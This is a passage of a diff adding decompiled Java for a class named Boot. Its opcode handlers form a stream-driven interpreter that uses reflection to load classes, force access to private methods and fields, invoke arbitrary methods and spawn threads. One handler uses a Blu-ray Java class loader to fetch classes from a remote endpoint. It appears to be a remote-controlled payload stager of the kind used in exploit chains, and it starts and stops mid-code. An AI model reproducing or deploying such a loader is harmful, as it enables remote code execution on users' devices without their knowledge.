+                        int n9 = (int)((DataInputStream)object).readLong();
+                        Boot.O[n8] = Class.forName(S[n9], true, PAR);
+                        continue block58;
+                    }
+
+--- OPCODE 8 ---
+                    case 8: {
+                        Constructor<?>[] constructorArray;
+                        int n10 = (int)((DataInputStream)object).readLong();
+                        int n11 = (int)((DataInputStream)object).readLong();
+                        int n12 = (int)((DataInputStream)object).readLong();
+                        int n13 = (int)((DataInputStream)object).readLong();
+                        Throwable throwable = null;
+                        try {
+                            Boot.O[n10] = new L(Z[n11], S[n12]).loadClass(S[n12], true);
+                        }
+                        catch (Throwable throwable2) {
+                            throwable = throwable2;
+                            if (n13 == 0) {
+                                throw throwable2;
+                            }
+                            Class<?> clazz = Class.forName("org.dvb.lang.DVBClassLoader");
+                            constructorArray = Class.forName("[Ljava.net.URL;");
+                            Class<?> clazz2 = Class.forName("java.lang.ClassLoader");
+                            Method method = clazz.getMethod("newInstance", new Class[]{constructorArray, clazz2});
+                            Object object2 = Array.newInstance(Class.forName("java.net.URL"), 1);
+                            Array.set(object2, 0, new URL(EP + "/x/" + SID + "/"));
+                            Object object3 = method.invoke(null, object2, PAR);
+                            Method method2 = clazz2.getMethod("loadClass", Class.forName("java.lang.String"));
+                            Boot.O[n10] = (Class)method2.invoke(object3, S[n12]);
+                        }
+                        if (throwable != null && !said) {
+                            said = true;
+                            note = "d1:" + throwable.getClass().getName() + ":" + throwable.getMessage();
+                        }
+                        Boot.Z[n11] = null;
+                        continue block58;
+                    }
+
+--- OPCODE 9 ---
+                    case 9: {
+                        int n14;
+                        Constructor<?>[] constructorArray;
+                        int n15 = (int)((DataInputStream)object).readLong();
+                        Class clazz = Boot.cls(((DataInputStream)object).readLong());
+                        int n16 = ((DataInputStream)object).readUnsignedByte();
+                        Class[] classArray = new Class[n16];
+                        for (n14 = 0; n14 < n16; ++n14) {
+                            classArray[n14] = Boot.cls(((DataInputStream)object).readLong());
+                        }
+                        n14 = ((DataInputStream)object).readUnsignedByte();
+                        Object object4 = new Object[n14];
+                        for (int i = 0; i < n14; ++i) {
+                            object4[i] = Boot.arg((DataInputStream)object);
+                        }
+                        if (n14 == 0 && n16 == 0) {
+                            Boot.O[n15] = clazz.newInstance();
+                            continue block58;
+                        }
+                        Constructor<Object> constructor = null;
+                        if (n16 > 0) {
+                            try {
+                                constructor = clazz.getDeclaredConstructor(classArray);
+                            }
+                            catch (Throwable throwable) {
+                                constructor = clazz.getConstructor(classArray);
+                            }
+                        } else {
+                            constructorArray = null;
+                            try {
+                                constructorArray = clazz.getDeclaredConstructors();
+                            }
+                            catch (Throwable throwable) {
+                                constructorArray = clazz.getConstructors();
+                            }
+                            for (int i = 0; i < constructorArray.length; ++i) {
+                                if (constructorArray[i].getParameterTypes().length != n14) continue;
+                                constructor = constructorArray[i];
+                                break;
+                            }
+                        }
+                        try {
+                            constructor.setAccessible(true);
+                        }
+                        catch (Throwable throwable) {
+                            // empty catch block
+                        }
+                        Boot.O[n15] = constructor.newInstance((Object[])object4);
+                        continue block58;
+                    }
+
+--- OPCODE 10 ---
+                    case 10: {
+                        int n17 = (int)((DataInputStream)object).readLong();
+                        Class clazz = Boot.cls(((DataInputStream)object).readLong());
+                        int n18 = (int)((DataInputStream)object).readLong();
+                        int n19 = ((DataInputStream)object).readUnsignedByte();
+                        Class[] classArray = new Class[n19];
+                        for (int i = 0; i < n19; ++i) {
+                            classArray[i] = Boot.cls(((DataInputStream)object).readLong());
+                        }
+                        Object object4 = null;
+                        try {
+                            object4 = clazz.getDeclaredMethod(S[n18], classArray);
+                        }
+                        catch (Throwable throwable) {
+                            object4 = clazz.getMethod(S[n18], classArray);
+                        }
+                        try {
+                            ((Method)object4).setAccessible(true);
+                        }
+                        catch (Throwable throwable) {
+                            // empty catch block
+                        }
+                        Boot.M[n17] = object4;
+                        continue block58;
+                    }
+
+--- OPCODE 11 ---
+                    case 11: {
+                        int n20 = (int)((DataInputStream)object).readLong();
+                        Class clazz = Boot.cls(((DataInputStream)object).readLong());
+                        int n21 = (int)((DataInputStream)object).readLong();
+                        Field field = null;
+                        try {
+                            field = clazz.getDeclaredField(S[n21]);
+                        }
+                        catch (Throwable throwable) {
+                            field = clazz.getField(S[n21]);
+                        }
+                        try {
+                            field.setAccessible(true);
+                        }
+                        catch (Throwable throwable) {
+                            // empty catch block
+                        }
+                        Boot.M[n20] = field;
+                        continue block58;
+                    }
+
+--- OPCODE 12 ---
+                    case 12: {
+                        int n22 = (int)((DataInputStream)object).readLong();
+                        int n23 = (int)((DataInputStream)object).readLong();
+                        int n24 = (int)((DataInputStream)object).readLong();
+                        Object object5 = Boot.arg((DataInputStream)object);
+                        Boot.put(n22, n23, ((Field)M[n24]).get(object5));
+                        continue block58;
+                    }
+
+--- OPCODE 13 ---
+                    case 13: {
+                        int n25 = (int)((DataInputStream)object).readLong();
+                        Object object6 = Boot.arg((DataInputStream)object);
+                        Object object7 = Boot.arg((DataInputStream)object);
+                        ((Field)M[n25]).set(object6, object7);
+                        continue block58;
+                    }
+
+--- OPCODE 14 ---
+                    case 14: {
+                        int n26 = (int)((DataInputStream)object).readLong();
+                        int n27 = (int)((DataInputStream)object).readLong();
+                        int n28 = (int)((DataInputStream)object).readLong();
+                        Object object8 = Boot.arg((DataInputStream)object);
+                        int n29 = ((DataInputStream)object).readUnsignedByte();
+                        Object object4 = new Object[n29];
+                        for (int i = 0; i < n29; ++i) {
+                            object4[i] = Boot.arg((DataInputStream)object);
+                        }
+                        Boot.put(n26, n27, ((Method)M[n28]).invoke(object8, (Object[])object4));
+                        continue block58;
+                    }
+
+--- OPCODE 15 ---
+                    case 15: {
+                        int n30 = (int)((DataInputStream)object).readLong();
+                        Class clazz = Boot.cls(((DataInputStream)object).readLong());
+                        int n31 = (int)((DataInputStream)object).readLong();
+                        Boot.O[n30] = Array.newInstance(clazz, n31);
+                        continue block58;
+                    }
+
+--- OPCODE 16 ---
+                    case 16: {
+                        int n32 = (int)((DataInputStream)object).readLong();
+                        int n33 = (int)((DataInputStream)object).readLong();
+                        int n34 = (int)((DataInputStream)object).readLong();
+                        int n35 = (int)((DataInputStream)object).readLong();
+                        Boot.put(n32, n33, Array.get(O[n34], n35));
+                        continue block58;
+                    }
+
+--- OPCODE 17 ---
+                    case 17: {
+                        int n36 = (int)((DataInputStream)object).readLong();
+                        int n37 = (int)((DataInputStream)object).readLong();
+                        Array.set(O[n36], n37, Boot.arg((DataInputStream)object));
+                        continue block58;
+                    }
+
+--- OPCODE 18 ---
+                    case 18: {
+                        int n38 = (int)((DataInputStream)object).readLong();
+                        int n39 = (int)((DataInputStream)object).readLong();
+                        Boot.R[n38] = Array.getLength(O[n39]);
+                        continue block58;
+                    }
+
+--- OPCODE 19 ---
+                    case 19: {
+                        int n40 = (int)((DataInputStream)object).readLong();
+                        Boot.R[n40] = Boot.num(Boot.arg((DataInputStream)object));
+                        continue block58;
+                    }
+
+--- OPCODE 20 ---
+                    case 20: {
+                        int n41 = (int)((DataInputStream)object).readLong();
+                        int n42 = (int)((DataInputStream)object).readLong();
+                        long l6 = Boot.num(Boot.arg((DataInputStream)object));
+                        long l7 = Boot.num(Boot.arg((DataInputStream)object));
+                        long l8 = 0L;
+                        if (n42 == 0) {
+                            l8 = l6 + l7;
+                        } else if (n42 == 1) {
+                            l8 = l6 - l7;
+                        } else if (n42 == 2) {
+                            l8 = l6 & l7;
+                        } else if (n42 == 3) {
+                            l8 = l6 | l7;
+                        } else if (n42 == 4) {
+                            l8 = l6 ^ l7;
+                        } else if (n42 == 5) {
+                            l8 = l6 << (int)l7;
+                        } else if (n42 == 6) {
+                            l8 = l6 >>> (int)l7;
+                        } else if (n42 == 7) {
+                            l8 = l6 * l7;
+                        } else if (n42 == 8) {
+                            l8 = l7 == 0L ? 0L : l6 / l7;
+                        } else if (n42 == 9) {
+                            l8 = l6 == l7 ? 1L : 0L;
+                        } else if (n42 == 10) {
+                            l8 = l6 < l7 ? 1L : 0L;
+                        } else if (n42 == 11) {
+                            l8 = l6 > l7 ? 1L : 0L;
+                        }
+                        Boot.R[n41] = l8;
+                        continue block58;
+                    }
+
+--- OPCODE 21 ---
+                    case 21: {
+                        dataOutputStream.writeLong(Boot.num(Boot.arg((DataInputStream)object)));
+                        continue block58;
+                    }
+
+--- OPCODE 22 ---
+                    case 22: {
+                        Object object4;
+                        int n43 = (int)((DataInputStream)object).readLong();
+                        int n44 = (int)((DataInputStream)object).readLong();
+                        Object object9 = O[n43];
+                        ByteArrayOutputStream byteArrayOutputStream2 = new ByteArrayOutputStream();
+                        DataOutputStream dataOutputStream2 = new DataOutputStream(byteArrayOutputStream2);
+                        if (object9 != null) {
+                            if (n44 == 0) {
+                                object4 = (byte[])object9;
+                                dataOutputStream2.write((byte[])object4, 0, ((Object[])object4).length);
+                            } else if (n44 == 1) {
+                                object4 = (int[])object9;
+                                for (int i = 0; i < ((Object[])object4).length; ++i) {
+                                    dataOutputStream2.writeInt((int)object4[i]);
+                                }
+                            } else if (n44 == 2) {
+                                object4 = (long[])object9;
+                                for (int i = 0; i < ((Object)object4).length; ++i) {
+                                    dataOutputStream2.writeLong((long)object4[i]);
+                                }
+                            }
+                        }
+                        dataOutputStream2.flush();
+                        vector.addElement(byteArrayOutputStream2.toByteArray());
+                        continue block58;
+                    }
+
+--- OPCODE 23 ---
+                    case 23: {
+                        int n45 = (int)((DataInputStream)object).readLong();
+                        vector.addElement(Z[n45] == null ? new byte[]{} : Z[n45]);
+                        continue block58;
+                    }
+
+--- OPCODE 24 ---
+                    case 24: {
+                        int n46 = (int)((DataInputStream)object).readLong();
+                        int n47 = (int)((DataInputStream)object).readLong();
+                        if (R[n46] != 0L) continue block58;
+                        for (int i = 0; i < n47 && n < n2; ++n, ++i) {
+                            Boot.skip((DataInputStream)object);
+                        }
+                        continue block58;
+                    }
+
+--- OPCODE 25 ---
+                    case 25: {
+                        System.gc();
+                        System.gc();
+                        continue block58;
+                    }
+
+--- OPCODE 26 ---
+                    case 26: {
+                        int n48 = (int)((DataInputStream)object).readLong();
+                        int n49 = (int)((DataInputStream)object).readLong();
+                        Boot.O[n48] = O[n49];
+                        continue block58;
+                    }
+
+--- OPCODE 27 ---
+                    case 27: {
+                        int n50 = (int)((DataInputStream)object).readLong();
+                        Boot.O[n50] = Boot.arg((DataInputStream)object);
+                        continue block58;
+                    }
+
+--- OPCODE 28 ---
+                    case 28: {
+                        int n51 = (int)((DataInputStream)object).readLong();
+                        int n52 = (int)((DataInputStream)object).readLong();
+                        Boot.O[n51] = new Object[]{O[n52]};
+                        continue block58;
+                    }
+
+--- OPCODE 30 ---
+                    case 30: {
+                        int n53 = (int)((DataInputStream)object).readLong();
+                        int n54 = (int)((DataInputStream)object).readLong();
+                        Boot.O[n53] = M[n54];
+                        continue block58;
+                    }
+
+--- OPCODE 29 ---
+                    case 29: {
+                        int n55 = (int)((DataInputStream)object).readLong();
+                        final Object object10 = Boot.arg((DataInputStream)object);
+                        int n56 = ((DataInputStream)object).readUnsignedByte();
+                        final Object[] objectArray = new Object[n56];
+                        for (int i = 0; i < n56; ++i) {
+                            objectArray[i] = Boot.arg((DataInputStream)object);
+                        }
+                        final Method method = (Method)M[n55];
+                        new Thread(new Runnable(){
